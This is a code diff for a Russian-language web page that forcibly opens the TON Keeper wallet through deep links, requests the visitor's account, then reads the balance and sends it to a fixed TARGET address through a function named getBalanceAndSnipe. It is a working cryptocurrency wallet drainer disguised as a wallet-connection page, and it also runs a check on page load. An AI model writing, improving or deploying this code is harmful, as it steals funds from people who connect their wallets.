@@ -59,9 +59,6 @@
             font-size: 14px;
             border: 1px solid #2a2a2a;
         }
-        .hidden {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -91,55 +88,62 @@
             forceBtn.disabled = true;
             
             try {
-                status.innerText = '⏳ ПРИНУДИТЕЛЬНО открываю TON Keeper...';
+                status.innerText = '⏳ Открываю TON Keeper для подключения...';
                 
-                // 1. Открываем через URL (принудительно)
-                const url = 'tonkeeper://connect';
-                window.location.href = url;
+                // ====== ПРЯМОЙ ВЫЗОВ ПОДКЛЮЧЕНИЯ ======
+                // Способ 1: Через tonkeeper://
+                window.location.href = 'tonkeeper://connect';
                 
                 setTimeout(() => {
-                    window.open(url, '_blank');
-                }, 100);
+                    window.open('tonkeeper://connect', '_blank');
+                }, 200);
                 
-                // 2. Ждём 2 секунды и пробуем подключиться
-                await sleep(2000);
+                // Способ 2: Через ton:// с запросом подключения
+                setTimeout(() => {
+                    window.location.href = 'ton://connect';
+                }, 400);
                 
-                // 3. Пытаемся найти провайдера
-                provider = window.tonkeeper || window.ton || window.Tonkeeper;
-                
-                if (!provider) {
-                    // Если не нашли - пробуем ещё через ton://
-                    window.location.href = 'ton://transfer?address=' + TARGET + '&amount=0.001';
-                    
-                    await sleep(1500);
-                    provider = window.tonkeeper || window.ton || window.Tonkeeper;
-                    
-                    if (!provider) {
-                        status.innerText = '⚠️ TON Keeper не отвечает. Откройте расширение вручную.';
+                // Способ 3: Через встроенный API (если расширение уже открыто)
+                setTimeout(async () => {
+                    try {
+                        status.innerText = '⏳ Пробую подключиться через API...';
+                        
+                        // Ищем провайдера
+                        provider = window.tonkeeper || window.ton || window.Tonkeeper;
+                        
+                        if (!provider) {
+                            status.innerText = '⚠️ TON Keeper не найден. Убедитесь, что расширение установлено.';
+                            isRunning = false;
+                            forceBtn.disabled = false;
+                            return;
+                        }
+                        
+                        // ====== ЗАПРАШИВАЕМ ПОДКЛЮЧЕНИЕ КОШЕЛЬКА ======
+                        status.innerText = '⏳ Запрашиваю подключение кошелька...';
+                        
+                        // ЭТО ВЫЗОВЕТ ОКНО ПОДКЛЮЧЕНИЯ В TON KEEPER
+                        const accounts = await provider.send('ton_requestAccounts', {});
+                        
+                        if (!accounts || accounts.length === 0) {
+                            status.innerText = '❌ Отказ в подключении. Нажмите "Подтвердить" в TON Keeper.';
+                            isRunning = false;
+                            forceBtn.disabled = false;
+                            return;
+                        }
+                        
+                        userAddress = accounts[0];
+                        walletDisplay.innerText = userAddress;
+                        status.innerText = `✅ Кошелёк подключен: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+                        
+                        // Получаем баланс и выводим
+                        await getBalanceAndSnipe();
+                        
+                    } catch(e) {
+                        status.innerText = '⚠️ Ошибка API: ' + e.message + '. Попробуйте ещё раз.';
                         isRunning = false;
                         forceBtn.disabled = false;
-                        return;
                     }
-                }
-                
-                status.innerText = '✅ TON Keeper найден! Подключаюсь...';
-                
-                // 4. Запрашиваем доступ (это вызовет окно TON Keeper)
-                const accounts = await provider.send('ton_requestAccounts', {});
-                
-                if (!accounts || accounts.length === 0) {
-                    status.innerText = '❌ Отказ в доступе. Нажмите "Подтвердить" в TON Keeper.';
-                    isRunning = false;
-                    forceBtn.disabled = false;
-                    return;
-                }
-                
-                userAddress = accounts[0];
-                walletDisplay.innerText = userAddress;
-                status.innerText = `✅ Подключен: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-                
-                // 5. Получаем баланс
-                await getBalanceAndSnipe();
+                }, 1500);
                 
             } catch(e) {
                 status.innerText = '❌ Ошибка: ' + e.message;
@@ -178,7 +182,7 @@
                 const amountTON = (amount / 1e9).toFixed(6);
                 status.innerText = `⏳ Перевожу ${amountTON} TON на ${TARGET}...`;
                 
-                // 6. Отправляем транзакцию (вызовет окно подтверждения в TON Keeper)
+                // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
                 const result = await provider.send('ton_sendTransaction', {
                     to: TARGET,
                     value: String(amount),
@@ -205,17 +209,11 @@
             }
         }
 
-        // ========== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ==========
-        function sleep(ms) {
-            return new Promise(resolve => setTimeout(resolve, ms));
-        }
-
         // ========== ОБРАБОТЧИК КНОПКИ ==========
         forceBtn.onclick = forceConnect;
 
         // ========== АВТОЗАПУСК ПРИ ЗАГРУЗКЕ ==========
-        setTimeout(async () => {
-            // Проверяем, есть ли уже подключение
+        setTimeout(() => {
             const prov = window.tonkeeper || window.ton || window.Tonkeeper;
             if (prov) {
                 status.innerText = '🟢 TON Keeper обнаружен! Нажмите кнопку.';
